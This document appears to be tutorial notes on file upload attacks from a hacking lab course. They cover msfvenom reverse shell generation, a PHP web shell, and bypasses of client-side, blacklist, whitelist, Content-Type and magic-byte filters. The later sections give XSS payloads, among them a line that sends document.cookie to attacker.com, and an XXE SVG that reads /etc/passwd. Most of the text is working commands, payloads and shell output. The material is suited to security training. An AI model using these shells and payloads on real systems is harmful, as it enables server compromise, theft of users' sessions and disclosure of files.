While it is possible to use the same `system()` function and pass it a reverse shell command (like a bash one-liner), this may not always be reliable. The command may fail for various reasons — shell character encoding issues, restricted environments, missing utilities, etc. This is why it is always better to use **core web framework functions** to establish the connection, as they are more stable and reliable.

**Using msfvenom to generate reverse shells:**

`msfvenom` is Metasploit''s payload generation tool. It can generate reverse shell scripts in many languages and may also attempt to bypass certain restrictions in place (e.g., obfuscation to avoid AV detection).

**Generate a PHP reverse shell:**

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

**Command Breakdown:**
- `msfvenom` — Metasploit''s standalone payload generator tool (part of the Metasploit Framework)
- `-p php/reverse_php` — Specifies the payload to use. `php/reverse_php` is a PHP reverse TCP shell payload. The format is `language/payload_name`
- `LHOST=OUR_IP` — Sets the `LHOST` (Listener Host) option — your attacking machine''s IP address that the reverse shell will connect back to
- `LPORT=OUR_PORT` — Sets the `LPORT` (Listener Port) option — the port on your machine that netcat is listening on
- `-f raw` — Specifies the output format. `raw` outputs the payload as plain PHP code without any encoding or wrapping
- `> reverse.php` — Redirects the generated payload output to a file named `reverse.php`

**Expected Output:**

```
...SNIP...
Payload size: 3033 bytes
```

The generated `reverse.php` file is a stable, reliable PHP reverse shell that uses PHP''s native socket functions.

**Step 2 — Start a netcat listener and upload the generated shell:**

```bash
nc -lvnp OUR_PORT
```

Upload `reverse.php` via the vulnerable upload form, visit its URL, and the reverse shell connects back:

```bash
nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Generating reverse shells for other languages:**

`msfvenom` supports many payloads for different languages. Use the `-p` flag to specify the language/payload and the `-f` flag for the output format:

```bash
msfvenom -p asp/reverse_tcp LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.jsp
msfvenom -p windows/shell_reverse_tcp LHOST=OUR_IP LPORT=OUR_PORT -f exe > reverse.exe
```

**Reverse shells vs. web shells:**

While **reverse shells are always preferred** over web shells (because they provide a fully interactive terminal session for controlling the compromised server), they may not always work. Reasons for failure include:
- A firewall on the back-end network blocking **outgoing connections**
- The web server having `disable_functions` set in `php.ini`, blocking socket-creation functions
- Strict egress filtering preventing the server from connecting to external IPs

In these cases, we fall back to web shells, which only require the server to respond to incoming HTTP requests (which are almost always allowed). The web shell operates within the existing HTTP channel rather than creating a new outbound connection.

---

## Client-Side Validation

Many web applications only rely on **front-end JavaScript code** to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image). The validation logic runs entirely inside the user''s browser — there is no server involvement until the actual upload request is sent.

However, since the file format validation is happening on the **client-side**, we can easily bypass it by:
1. **Directly modifying the HTTP upload request** to the server (bypassing the browser''s validation logic entirely)
2. **Modifying the front-end code** through the browser''s developer tools to disable or remove the validation function

Any code that runs on the client-side is under our complete control. While the web server is responsible for sending the front-end code, the rendering and execution of the front-end code happen within our browser — and we can change it. If the web application does not apply any validation on the back-end, we should be able to upload any file type once we bypass the client-side checks.

---

### Back-end Request Modification

When we examine the web application''s normal behavior using Burp Suite, we can see that selecting and uploading an image sends a standard HTTP POST request to `/upload.php`. This request contains the file''s name, content type, and the file data. The key insight is that **this request is entirely under our control** once we intercept it — the server receives what we send, regardless of what the browser''s JavaScript would have validated.

**Intercepting and modifying the upload request in Burp Suite:**

1. Enable Burp Suite''s proxy and intercept mode
2. Select a legitimate image file (e.g., `HTB.png`) in the upload form and click Upload
3. Burp intercepts the POST request — you can see fields like:
   - `filename="HTB.png"` — The file name sent to the server
   - `Content-Type: image/png` — The MIME type of the file
   - The raw file content (binary image data) at the bottom of the request body

**Modify the request:**
- Change `filename="HTB.png"` to `filename="shell.php"`
- Replace the image content with our PHP web shell: `<?php system($_REQUEST[''cmd'']); ?>`
- Forward the modified request to the server

The server receives a request claiming to upload `shell.php` with PHP web shell content. If the back-end does **not** validate the file type, it accepts and stores it.

**Result:**

```
File successfully uploaded
```

We bypassed the client-side validation completely by intercepting the request after the browser sent it (post-validation) and modifying it before it reached the server. Now we visit:

```
http://SERVER_IP:PORT/uploads/shell.php?cmd=id
```

And we have remote code execution.

**Note:** We may also modify the `Content-Type` of the uploaded file (e.g., change `image/png` to `application/x-php`). However, at this stage — when there is no back-end validation — this is not necessary. It becomes relevant when the server checks Content-Type headers as a validation mechanism (covered in Type Filters section).

---

### Disabling Front-end Validation

An alternative method to bypass client-side validations is to **directly manipulate the front-end code** in the browser''s developer tools. Since all the validation is running in JavaScript within our browser, we can view, edit, and delete that JavaScript to remove the restrictions before uploading.

**Step 1 — Inspect the file input element:**

Press `CTRL+SHIFT+C` to toggle the browser''s **Page Inspector** (Element Inspector). Click on the profile image / upload area to highlight the relevant HTML element. The file input element appears as:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

**Key attributes to note:**
- `accept=".jpg,.jpeg,.png"` — Restricts the file selection dialog to only show JPG and PNG files. This can be changed or removed to allow all file types in the dialog.
- `onchange="checkFile(this)"` — This is the critical attribute. Every time a file is selected, the JavaScript function `checkFile()` is called with the file input element as its argument. This function performs the validation.

**Step 2 — Examine the validation function:**

Press `CTRL+SHIFT+K` to open the browser **Console**. Type `checkFile` to view the function''s code:

```javascript
function checkFile(File) {
...SNIP...
    if (extension !== ''jpg'' && extension !== ''jpeg'' && extension !== ''png'') {
        $(''#error_message'').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```

**What this function does:**
- Checks the extension of the selected file
- If the extension is NOT `.jpg`, `.jpeg`, or `.png`, it:
  - Displays the error message "Only images are allowed!"
  - Resets the form (clears the selected file)
  - Disables the Upload button (`disabled`, `true`)

This function runs client-side and is what prevents us from uploading `.php` files through the form normally.

**Step 3 — Remove the validation function:**

Go back to the Page Inspector, click on the profile image again to highlight the input element, then **double-click** on `checkFile` in the `onchange="checkFile(this)"` attribute and **delete it**. The attribute now reads:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="" accept=".jpg,.jpeg,.png">
```

Optionally, also remove `accept=".jpg,.jpeg,.png"` to make it easier to select `.php` files in the file dialog (though this is not mandatory — you can still select "All Files").

**Step 4 — Upload the web shell:**

Now select our `shell.php` file through the file dialog. Since the `checkFile` function no longer runs, no validation fires, no error message appears, and the Upload button remains enabled. Click Upload — the shell uploads successfully.

**Step 5 — Find the uploaded file path:**

Press `CTRL+SHIFT+C` (Page Inspector), click on the profile image, and look at the `src` attribute:

```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

This reveals the uploaded file path. Navigate to it:

```
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Important Note:** The modification made to the source code is **temporary** and will not persist through page refreshes — we are only changing it on the client-side in memory. However, our only need is to bypass the client-side validation for the single upload action, so this is sufficient.

**Note:** The above steps apply to **Firefox**. Other browsers may have slightly different developer tools interfaces. For example, Chrome uses **Overrides** for persistent source changes, while in Firefox the changes take effect immediately in the current page session.

---

## Blacklist Filters

When client-side validation alone is insufficient, web applications implement **back-end validation** on the server. This ensures that even if an attacker bypasses the front-end, the server still enforces restrictions. There are two main forms of back-end extension validation:

1. **Blacklist-based validation** — Explicitly blocks specific file extensions (e.g., `.php`, `.exe`)
2. **Whitelist-based validation** — Only allows specific file extensions (e.g., `.jpg`, `.png`)

This section covers blacklist-based validation — its weaknesses and how to bypass it.

---

### Blacklisting Extensions

A **blacklist** is an array or list of extensions that are explicitly denied. Any extension not on the list is implicitly allowed. This approach is inherently flawed because it is virtually impossible to enumerate every dangerous extension — especially considering the many alternative extensions that PHP and other languages support.

**Example of a PHP blacklist implementation:**

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array(''php'', ''php7'', ''phps'');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

**Code Breakdown:**
- `$_FILES["uploadFile"]["name"]` — Gets the original name of the uploaded file from the HTTP request
- `basename()` — Returns only the filename part of a full path, stripping any directory components (prevents path traversal in the filename itself)
- `pathinfo($fileName, PATHINFO_EXTENSION)` — Extracts only the **file extension** from the filename. For `shell.php`, it returns `php`.
- `$blacklist = array(''php'', ''php7'', ''phps'')` — The blacklist array containing denied extensions
- `in_array($extension, $blacklist)` — Checks if the extracted extension exists in the blacklist array
- If the extension is found in the blacklist, it echoes "File type not allowed" and terminates with `die()`

**Critical Weakness of this approach:**
This blacklist only blocks three extensions (`php`, `php7`, `phps`). PHP has **many other valid extensions** that the server can still execute as PHP code — none of which are in this blacklist. An attacker only needs to find one extension not on the list.

**Additional Weakness — Case sensitivity:**
The comparison above is **case-sensitive** and only considers lowercase extensions. On **Windows servers**, file names are case-insensitive, so uploading `shell.pHp` or `shell.PHP` may bypass the blacklist (since the check looks for `php` exactly) while still being executed as PHP by the server.

---

### Fuzzing Extensions

To find which extensions bypass the blacklist, we use **Burp Suite Intruder** to fuzz the upload request with a comprehensive list of PHP-compatible extensions.

**Setting up the fuzz:**

1. Capture an upload request in Burp Suite History
2. Right-click the request → **Send to Intruder**
3. In the **Positions** tab: clear all automatic positions, then highlight `.php` in `filename="HTB.php"` and click **Add** to set it as the fuzzing position
4. Set the attack type to **Sniper** (one payload position, one wordlist)
5. In the **Payloads** tab: load the PHP extensions wordlist (from PayloadsAllTheThings or SecLists)
6. In the **Payloads** tab: **uncheck URL Encoding** — this prevents Burp from encoding the `.` (dot) before the extension, which would break the file extension
7. Click **Start Attack**

**Analyzing Results:**
- Sort results by **Length** (response content length)
- Responses with a consistent length (e.g., 193 bytes) and "File successfully uploaded" message indicate **allowed extensions** (not on the blacklist)
- Responses with a different length and "Extension not allowed" message indicate **blocked extensions**

**Extension wordlists from PayloadsAllTheThings (PHP extensions):**

Common PHP extensions that may bypass a basic blacklist:
`.php`, `.php2`, `.php3`, `.php4`, `.php5`, `.php6`, `.php7`, `.phps`, `.pht`, `.phtml`, `.pgif`, `.shtml`, `.phar`, `.inc`, `.hphp`, `.ctp`, `.module`

Many of these are recognized by Apache/Nginx as PHP files and executed as such, yet they are often overlooked in blacklists.

---

### Non-Blacklisted Extensions

After identifying which extensions are not blacklisted, we try uploading a PHP web shell using one of those allowed extensions. Not all extensions will work with all web server configurations, so we may need to try several until one successfully executes PHP code.

**Using `.phtml` extension (commonly allowed):**

`.phtml` is a PHP extension that many PHP-configured web servers execute as PHP code. It is often missing from basic blacklists because developers focus on `.php` and forget about its variants.

**In Burp Repeater:**
1. Right-click on the `.phtml` request from Intruder results → **Send to Repeater**
2. In Repeater: change `filename="HTB.phtml"` and replace the file content with our PHP web shell: `<?php system($_REQUEST[''cmd'']); ?>`
3. Send the request

**Expected Response:**

```
File successfully uploaded
```

**Visit the uploaded file:**

```
http://SERVER_IP:PORT/profile_images/shell.phtml?cmd=id
```

**Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We successfully bypassed the blacklist by using `.phtml` — an extension not on the blacklist — and confirmed PHP code execution. The approach: blacklists are inherently incomplete; find the gap.

---

## Whitelist Filters

A **whitelist** is generally more secure than a blacklist. Instead of blocking known-bad extensions, it only **allows known-good extensions**. Any extension not on the whitelist is implicitly denied. This is more secure because the developer only needs to define what is allowed, not anticipate every possible dangerous extension.

**When to use each:**
- **Blacklist** — More suitable when the upload functionality needs to accept a wide variety of file types (e.g., a general file manager). The developer blocks specific dangerous types while allowing most others.
- **Whitelist** — More suitable when only a narrow set of file types is needed (e.g., profile picture upload accepting only images). Only a few extensions are allowed.
- Both may be used together for layered defense.

---

### Whitelisting Extensions

**Example of a PHP whitelist implementation (with a flaw):**

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match(''^.*\.(jpg|jpeg|png|gif)'', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

**Code Breakdown:**
- `preg_match(''^.*\.(jpg|jpeg|png|gif)'', $fileName)` — Uses a **regular expression (regex)** to test if the filename matches the pattern
- `^.*\.` — Matches the start of the string (`^`), then any characters (`.*`), then a literal dot (`\.`)
- `(jpg|jpeg|png|gif)` — After the dot, one of these four extensions must follow
- The `!` negates the result — if the pattern does NOT match, the upload is blocked
- The critical flaw: **there is no `$` at the end of the regex**. Without the end-of-string anchor `$`, the regex only checks that the filename **contains** the extension somewhere, not that it **ends** with it

**The Flaw:** A filename like `shell.php.jpg` matches the regex because it **contains** `.jpg`. The regex finds `.jpg` in the middle of the string and considers it a match, even though the file ends in `.php`.

---

### Double Extensions

The **Double Extension** technique exploits the flaw in regex-based whitelist validation where the pattern checks for the presence of an allowed extension anywhere in the filename rather than at the end.

**Attack:** Name the file using both the allowed extension and our malicious extension, in the format `shell.jpg.php`:
- The regex pattern finds `.jpg` → match → upload is allowed
- The actual final extension is `.php` → server executes it as PHP

**Modifying the upload request in Burp:**
- Change `filename="HTB.png"` to `filename="shell.jpg.php"`
- Replace file content with the PHP web shell

**Result:** File successfully uploaded.

**Visit the shell:**

```
http://SERVER_IP:PORT/profile_images/shell.jpg.php?cmd=id
```

**Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**However**, this technique does NOT work against a properly anchored regex like:

```php
if (!preg_match(''/^.*\.(jpg|jpeg|png|gif)$/'', $fileName)) { ...SNIP... }
```

Here, the `$` at the end means the extension must be at the **very end** of the filename. `shell.jpg.php` ends in `.php` — not in `.jpg` — so the regex does not match and the file is blocked. In this case, we need other techniques like **Reverse Double Extension** or **Character Injection**.

---

### Reverse Double Extension

The **Reverse Double Extension** technique targets a **server-side misconfiguration** rather than the upload form''s validation. Even if the upload form has a perfect whitelist (only allowing files ending in `.jpg`), the web server itself may be misconfigured to execute PHP in any file that merely **contains** a PHP extension.

**Example of a vulnerable Apache configuration (`/etc/apache2/mods-enabled/php7.4.conf`):**

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**Configuration Breakdown:**
- `<FilesMatch>` — An Apache directive that matches files by name using a regex
- `.+\.ph(ar|p|tml)` — Matches any file whose name contains `.phar`, `.php`, or `.phtml` **anywhere** in the filename
- `SetHandler application/x-httpd-php` — Tells Apache to handle matching files as PHP — meaning PHP code within them will be executed

**The Flaw:** Just like the upload form''s bad regex, this Apache config has **no `$` anchor**. It checks if the filename **contains** `.php` (or `.phar`, `.phtml`) — not if it **ends** with it. So a file named `shell.php.jpg`:
- **Passes the whitelist** — ends in `.jpg` ✅
- **Executes as PHP** — contains `.php` → Apache''s `FilesMatch` triggers → PHP executed ✅

**Attack:** Upload a file named `shell.php.jpg`:
- The whitelist check: filename ends in `.jpg` → passes ✅
- Apache''s PHP handler: filename contains `.php` → executes as PHP ✅
- Our PHP web shell code inside the file gets executed

**Modifying the upload request:**
- Change `filename="HTB.jpg"` to `filename="shell.php.jpg"`
- Replace file content with the PHP web shell

**Visit the shell:**

```
http://SERVER_IP:PORT/profile_images/shell.php.jpg?cmd=id
```

**Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We bypassed the strict whitelist test and exploited the web server misconfiguration to execute PHP code and gain control over the server.

**Exercise Note:** The web application may use a blacklist alongside the whitelist. Try fuzzing with the PHP Wordlist to see which extensions are blacklisted. Combine blacklist bypass techniques if necessary.

---

### Character Injection

**Character Injection** is a technique to bypass whitelist validation by injecting special characters into the filename that cause the web application or web server to **misinterpret the file extension**. The injected character tricks the parser into reading only part of the filename when determining the extension — causing the stored file to have a different extension than what appears in the request.

**Characters to try injecting:**

| Character | URL Encoded | Use Case |
|---|---|---|
| Space | `%20` | May cause the filename to be truncated at the space |
| Newline | `%0a` | Line feed may terminate string parsing |
| Null byte | `%00` | Terminates string in C-based functions (PHP < 5.5) |
| Carriage return + newline | `%0d0a` | Combined line ending may confuse parsers |
| Forward slash | `/` | May be interpreted as a directory separator |
| Backslash + period | `.\` | Windows path separator that may confuse parsers |
| Period | `.` | Trailing dot (Windows ignores trailing dots in filenames) |
| Ellipsis | `…` | May confuse multi-byte parsers |
| Colon | `:` | Windows Alternate Data Stream separator |

**Example — Null byte injection (PHP < 5.5):**

Filename: `shell.php%00.jpg`

- The server receives the filename with `%00` (null byte) before `.jpg`
- The back-end processes the filename: PHP sees `shell.php` + null byte + `.jpg`
- In C-based string functions (used internally), the null byte terminates the string
- The file is stored as `shell.php` (null byte + `.jpg` is ignored)
- The whitelist only saw `.jpg` and allowed it
- The stored file is `shell.php` which PHP executes

**Example — Windows colon injection:**

Filename: `shell.aspx:.jpg`

- Windows treats `:` as an Alternate Data Stream separator
- The actual file written is `shell.aspx` (the `:jpg` part creates an ADS or is truncated)
- The whitelist saw `.jpg` and allowed it

**Automating Character Injection with a bash script:**

```bash
for char in ''%20'' ''%0a'' ''%00'' ''%0d0a'' ''/'' ''.\\'' ''.'' ''…'' '':''; do
    for ext in ''.php'' ''.phps''; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

**Script Breakdown:**
- `for char in ''%20'' ''%0a'' ''%00'' ...` — Outer loop: iterates over each special character to inject
- `for ext in ''.php'' ''.phps''` — Inner loop: iterates over PHP extensions to embed
- **Four echo lines per combination** — generates four permutations of where the character and extension can be placed relative to `.jpg`:
  - `shell<char><ext>.jpg` — char+extension before the whitelist extension
  - `shell<ext><char>.jpg` — extension+char before the whitelist extension
  - `shell.jpg<char><ext>` — char+extension after the whitelist extension
  - `shell.jpg<ext><char>` — extension+char after the whitelist extension
- `>> wordlist.txt` — Appends each generated filename to the wordlist file (doesn''t overwrite — adds to it)

**Using the wordlist:** Run a Burp Intruder scan with this custom wordlist, fuzzing the `filename` field in the upload request. Any filename that uploads successfully AND executes PHP when visited is a successful bypass.

**Exercise:** Add more PHP extensions (e.g., `.phtml`, `.phar`, `.php5`) to the `ext` loop to generate more permutations, then run the full fuzzing scan.

---

## Type Filters

File extension validation alone (blacklist or whitelist) is not sufficient to prevent file upload attacks. As demonstrated in previous sections, extension bypasses like double extensions or non-blacklisted extensions can still lead to PHP execution. This is why **many modern web servers and web applications also test the content of the uploaded file** — not just its name — to ensure it matches the expected type.

There are two common methods for validating file content:
1. **Content-Type Header** — Checks the MIME type declared in the HTTP request header
2. **MIME Type (Magic Bytes)** — Checks the actual first bytes of the file content to determine its true type

---

### Content-Type

The **Content-Type header** in an HTTP upload request declares the MIME type of the uploaded file. For example, when uploading a JPEG image, the browser automatically sets `Content-Type: image/jpeg`. A web application can check this header value to determine the file type.

**Example of a PHP Content-Type validation:**

```php
$type = $_FILES[''uploadFile''][''type''];

if (!in_array($type, array(''image/jpg'', ''image/jpeg'', ''image/png'', ''image/gif''))) {
    echo "Only images are allowed";
    die();
}
```

**Code Breakdown:**
- `$_FILES[''uploadFile''][''type'']` — Gets the Content-Type value from the `$_FILES` superglobal, which is populated from the uploaded file''s `Content-Type` header in the HTTP request
- `in_array($type, array(...))` — Checks if the declared type is in the allowed types array: `image/jpg`, `image/jpeg`, `image/png`, `image/gif`
- If the type is not in the allowed list, upload is rejected

**The Flaw:** The Content-Type header is set by the **browser** (client-side) when uploading a file — and since it is a client-side value, **we can change it**. The server is trusting our declared type rather than verifying the actual file content. This makes Content-Type validation a client-side check masquerading as a server-side check.

**Fuzzing for allowed Content-Types:**

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep ''image/'' > image-content-types.txt
```

**Command Breakdown:**
- `wget <url>` — Downloads the file at the specified URL to the current directory. This downloads a comprehensive list of all known Content-Type values from SecLists on GitHub
- `cat web-all-content-types.txt` — Outputs the full content of the downloaded file
- `| grep ''image/''` — Filters the output to only include lines containing `image/` (image MIME types)
- `> image-content-types.txt` — Writes the filtered output to a new file called `image-content-types.txt`

This reduces approximately 700 content types down to about 45 image-specific types, which we can fuzz against the upload endpoint using Burp Intruder.

**Bypass — Change the Content-Type header manually:**

Intercept the upload request in Burp Suite. Our upload request for `shell.php` will have `Content-Type: application/x-php` (or similar). Change it to `Content-Type: image/jpg`:

The HTTP request now declares the file as a JPEG image while the file content is still our PHP web shell. The server checks the Content-Type header, sees `image/jpg`, considers it a valid image, and allows the upload.

**Result:** File successfully uploaded.

**Visit the shell:**

```
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
```

**Output:**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Important Note:** A file upload HTTP request has **two Content-Type headers**:
1. **Main request Content-Type** — At the top of the request (e.g., `Content-Type: multipart/form-data; boundary=...`)
2. **File Content-Type** — Within the multipart body, specific to the uploaded file (e.g., `Content-Type: image/png`)

We typically need to modify the **file''s Content-Type header** (the inner one). In some cases where the upload content is sent as raw POST data (not multipart), only the main Content-Type header exists and must be modified.

---

### MIME-Type

**MIME (Multipurpose Internet Mail Extensions) type** validation is more robust than Content-Type header checking because it inspects the **actual content of the file** rather than trusting the declared header. This is done by reading the **first few bytes** of the uploaded file — known as the **File Signature** or **Magic Bytes** — which identify the true file format.

**How Magic Bytes work:**

Every file type has a characteristic byte sequence at the beginning of its content:

| File Type | Magic Bytes (Hex) | Magic Bytes (ASCII) |
|---|---|---|
| GIF87a image | `47 49 46 38 37 61` | `GIF87a` |
| GIF89a image | `47 49 46 38 39 61` | `GIF89a` |
| JPEG image | `FF D8 FF` | (non-printable) |
| PNG image | `89 50 4E 47 0D 0A 1A 0A` | `\x89PNG\r\n\x1a\n` |
| ZIP archive | `50 4B 03 04` | `PK..` |
| PDF document | `25 50 44 46` | `%PDF` |

The `file` command on Linux identifies a file''s type by reading its magic bytes — ignoring the file extension entirely.

**Demonstrating magic bytes with the `file` command:**

**Create a text file with a .jpg extension:**

```bash
echo "this is a text file" > text.jpg
file text.jpg
```

**Command Breakdown:**
- `echo "this is a text file" > text.jpg` — Creates a file named `text.jpg` with plain text content
- `file text.jpg` — Uses the `file` command to determine the file type by reading its content (not its extension)

**Output:**

```
text.jpg: ASCII text
```

Despite having a `.jpg` extension, the file is identified as ASCII text because it contains no JPEG magic bytes.

**Now change the content to GIF magic bytes:**

```bash
echo "GIF8" > text.jpg
file text.jpg
```

**Output:**

```
text.jpg: GIF image data
```

Just by adding `GIF8` at the start of the file (the common prefix of both GIF87a and GIF89a magic bytes), the `file` command now identifies it as a GIF image — even though the extension is `.jpg` and the rest of the content is just text. This is how MIME-type checking works: **the magic bytes define the type, not the extension**.

**Example of PHP MIME-type validation:**

```php
$type = mime_content_type($_FILES[''uploadFile''][''tmp_name'']);

if (!in_array($type, array(''image/jpg'', ''image/jpeg'', ''image/png'', ''image/gif''))) {
    echo "Only images are allowed";
    die();
}
```

**Code Breakdown:**
- `$_FILES[''uploadFile''][''tmp_name'']` — Gets the path to the **temporary file** that PHP stored the upload in on the server''s disk (PHP temporarily stores uploaded files before the script processes them)
- `mime_content_type()` — PHP''s built-in function that reads the magic bytes of the specified file and returns its MIME type (e.g., `image/gif`, `text/plain`). This is server-side content inspection — not relying on the client''s declared Content-Type
- The rest of the check is the same as before: only image MIME types are allowed

**Bypass — Prepend GIF magic bytes to the PHP shell:**

Since `mime_content_type()` checks the first bytes, we just need our file to **start with valid image magic bytes**. We add `GIF8` before our PHP code:

```
GIF8
<?php system($_REQUEST[''cmd'']); ?>
```

When `mime_content_type()` reads this file, it sees `GIF8` → identifies it as a GIF image → allows the upload.

When PHP''s `include()` or direct execution processes the file:
- `GIF8` is treated as text/output (printed as `GIF8` before the command output)
- `<?php system($_REQUEST[''cmd'']); ?>` is executed as PHP code

**In Burp Suite — Modify the file content:**

In the intercepted upload request body, change the file content to:

```
GIF8
<?php system($_REQUEST[''cmd'']); ?>
```

Keep the filename as `shell.php` (so PHP executes it) and send the request.

**Result:** File successfully uploaded.

**Visit the shell:**

```
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
```

**Output:**

```
GIF8
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `GIF8` appears first (the magic bytes are treated as text output), followed by the `id` command output. We successfully bypassed MIME-type validation.

**Note:** Why GIF specifically? Because GIF magic bytes (`GIF8`) are **ASCII-printable characters** — easy to type directly in Burp''s request body. JPEG and PNG magic bytes include non-printable binary characters that would require hex editing or special tools to insert. GIF is simply the most convenient format for this attack.

**Combining Techniques:**
We can combine multiple bypass methods to defeat more robust filters. For example:
- **Allowed MIME type + disallowed Content-Type** with a disallowed extension
- **Allowed MIME/Content-Type** with a disallowed extension (bypassing both MIME and Content-Type checks)
- **Disallowed MIME/Content-Type** with an allowed extension and magic bytes
- Various combinations and permutations to confuse the web server''s validation logic

Experimenting with different combinations is often necessary to bypass layered security controls.

---

## Limited File Uploads

In many cases, upload forms have more secure filters that cannot be bypassed using the techniques discussed so far. However, even if we cannot achieve arbitrary file uploads (i.e., upload and execute a PHP shell), **certain file types that are allowed can still be weaponized** to introduce vulnerabilities into the web application or attack users of the application.

File types like **SVG**, **HTML**, **XML**, and even some **image and document files** (PDF, Word, PowerPoint) may allow us to introduce new vulnerabilities by uploading maliciously crafted versions of them. This is why **fuzzing allowed file extensions** is always an important early step — to understand the full attack surface even when direct RCE is not immediately achievable.

---

### XSS

**Cross-Site Scripting (XSS)** via file upload can occur in multiple ways. The basic principle: if an allowed file type can contain JavaScript or be rendered in a browser, we may be able to embed an XSS payload in it that executes when a user views or interacts with the file.

**Method 1 — Uploading malicious HTML files:**

If the web application allows uploading HTML files, we can craft an HTML file containing a JavaScript payload:

```html
<script>alert(window.origin);</script>
```

When a victim visits the link to the uploaded HTML file, the browser renders and executes the JavaScript. This can be used for:
- XSS to steal cookies: `document.location=''http://attacker.com/steal?c=''+document.cookie`
- CSRF (Cross-Site Request Forgery) attacks
- Keyloggers, form hijackers, and other client-side attacks

**Method 2 — XSS in image metadata (EXIF data):**

Some web applications display an image''s metadata (EXIF data) after upload — for example, showing the camera model, location, or photographer name. If we inject an XSS payload into the EXIF metadata and the application displays it unsanitized, the JavaScript executes.

**Injecting XSS into the `Comment` EXIF field:**

```bash
exiftool -Comment='' "><img src=1 onerror=alert(window.origin)>'' HTB.jpg
```

**Command Breakdown:**
- `exiftool` — A powerful Perl-based tool for reading and writing metadata (EXIF, IPTC, XMP) in image and other media files
- `-Comment=''...''` — Sets the `Comment` EXIF metadata field to our XSS payload
- `"><img src=1 onerror=alert(window.origin)>` — The XSS payload. It closes any surrounding HTML attributes with `"` and `>`, then injects an `<img>` tag with an invalid `src=1` that triggers the `onerror` JavaScript event, which calls `alert(window.origin)` to show the domain
- `HTB.jpg` — The target JPEG file to inject the metadata into

**Verify the injection:**

```bash
exiftool HTB.jpg
```

**Command Breakdown:**
- `exiftool HTB.jpg` — Reads and displays all metadata from `HTB.jpg`
- Look for the `Comment` field in the output to confirm our payload was written

**Expected Output:**

```
...SNIP...
Comment: "><img src=1 onerror=alert(window.origin)>
```

When the web application displays this image''s metadata, the XSS payload is rendered as HTML and the JavaScript alert fires. Furthermore, if we change the image''s MIME-Type to `text/html`, some web applications may render the file as HTML instead of an image, triggering the XSS even if metadata is not displayed.

**Method 3 — XSS in SVG files:**

SVG (Scalable Vector Graphics) images are **XML-based** — they describe vector graphics using XML tags. Since SVG is XML, we can embed JavaScript directly inside the SVG:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

**SVG Code Breakdown:**
- `<?xml version="1.0" encoding="UTF-8"?>` — XML declaration specifying the version and character encoding
- `<!DOCTYPE svg ...>` — Document type declaration linking to the official SVG DTD schema
- `<svg xmlns="...">` — Root SVG element with the XML namespace
- `<rect .../>` — Draws a 1x1 green rectangle (minimal visible content to make it a valid SVG)
- `<script type="text/javascript">alert(window.origin);</script>` — Embeds JavaScript directly inside the SVG. When the browser renders this SVG, it executes the script. `window.origin` outputs the current domain.

Upload this SVG as the profile image. When any user (victim) views the page that displays this image, their browser renders the SVG and executes the embedded JavaScript — triggering the XSS. This is a **Stored XSS** attack because the malicious payload is permanently stored on the server.

---

### XXE

**XML External Entity (XXE)** attacks exploit XML parsers that process external entity references. SVG files (being XML-based) can carry XXE payloads. When the server parses the SVG''s XML data (e.g., to resize it, generate thumbnails, or display it), the XXE payload is triggered server-side — potentially reading sensitive files.

**XXE payload to read `/etc/passwd` via SVG:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

**SVG/XML Breakdown:**
- `<?xml version="1.0" encoding="UTF-8"?>` — XML declaration
- `<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` — Defines a DOCTYPE with an **external entity** named `xxe`. The `SYSTEM` keyword tells the XML parser to load the entity''s content from an external source — in this case, `file:///etc/passwd` (the Linux password file using the file:// URI scheme)
- `<svg>&xxe;</svg>` — The SVG body references the `xxe` entity with `&xxe;`. When the XML parser processes this, it substitutes `&xxe;` with the content of `/etc/passwd`

